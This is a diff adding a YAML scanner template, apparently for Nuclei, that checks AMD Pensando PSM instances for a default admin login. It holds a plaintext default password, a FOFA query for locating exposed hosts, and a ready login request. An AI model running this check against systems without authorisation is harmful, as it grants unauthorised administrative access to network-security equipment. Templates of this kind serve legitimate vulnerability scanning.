@@ -1,0 +1,51 @@
+id: pensando-default-login
+
+info:
+  name: AMD Pensando PSM  - Default Login
+  author: tpierru
+  severity: high
+  description: |
+    The AMD Pensando Policy and Services Manager used a default password for the admin account.This allowed instances to be accessed using the default credentials.
+  reference:
+    - https://www.amd.com/en/solutions/data-center/networking.html
+    - https://arubanetworking.hpe.com/techdocs/Pensando/AMD_Pensando_PSM_for_DSS_Guide-1.72.1-T.pdf
+  metadata:
+    verified: true
+    fofa-query: icon_hash="1907840597"
+  tags: pensando,default-login
+
+variables:
+  username: 'admin'
+  password: 'Pensando0$'
+
+flow: http(1) && http(2)
+
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}"
+
+    matchers:
+      - type: dsl
+        internal: true
+        dsl:
+          - 'contains(body,"<title>AMD Pensando PSM</title>")'
+          - 'status_code == 200'
+        condition: and
+
+  - raw:
+      - |
+        POST /v1/login HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/json
+
+        {"username":"{{username}}","password":"{{password}}","tenant":"default"}
+
+    matchers:
+      - type: dsl
+        dsl:
+          - 'status_code == 200'
+          - 'contains_all(body, "\"name\":\"admin\"")'
+          - 'contains(content_type, "application/json")'
+        condition: and
+# digest: 490a004630440220029eed1a78f2e2f4292ee1e1ee8f27f4b259c302988866c3c10920f0f105d78902206d358940a04b45510243fc7c3f631cf83c8dc9a6dfb3be7049aca1e0bcbad568:922c64590222798bb761d5b6d8e72950
